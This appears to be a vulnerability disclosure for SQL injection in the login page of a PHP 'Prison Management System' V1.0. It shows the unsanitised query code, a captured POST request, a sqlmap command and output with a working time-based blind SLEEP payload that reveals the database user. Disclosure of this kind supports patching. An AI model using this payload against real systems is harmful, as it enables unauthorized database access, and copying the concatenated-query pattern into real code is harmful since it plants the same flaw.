Prison Management System - SQL Injection on (/prison/Account/login.php) 

Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/prison/Account/login.php
```

In this scenario, user input (password) is directly  incorporated into an SQL query without any filtering or prepared  statements, making the application susceptible to SQL Injection attacks.

```
26: mysqli_query $result = mysqli_query($conn, $sql); 
25: $sql = "SELECT * FROM users WHERE email='" . $email . "' and password = '" . $password . "'  and status = '" . $status . "'"; 
20: $email = $_POST['txtemail']; 
21: $password = $_POST['txtpassword']; 
22: $status = 'Active'; 
requires:
12: if(isset($_POST['btnlogin']))
```

Proof of vulnerability:

Request:

```
POST /prison/Account/login.php HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: http://localhost:8888
Sec-GPC: 1
Connection: close
Referer: http://localhost:8888/prison/Account/login.php
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

txtemail=admin%40qq.com&txtpassword=admin123*&btnlogin=
```

```
python3 sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

```
sqlmap identified the following injection point(s) with a total of 206 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: txtemail=admin@qq.com&txtpassword=admin123' AND (SELECT 4485 FROM (SELECT(SLEEP(5)))Yyls) AND 'fzXr'='fzXr&btnlogin=
---
[10:25:02] [INFO] the back-end DBMS is MySQL
[10:25:02] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[10:25:02] [INFO] fetching current user
[10:25:02] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[10:25:17] [INFO] adjusting time delay to 1 second due to good response times
root@localhost
current user: 'root@localhost'
```

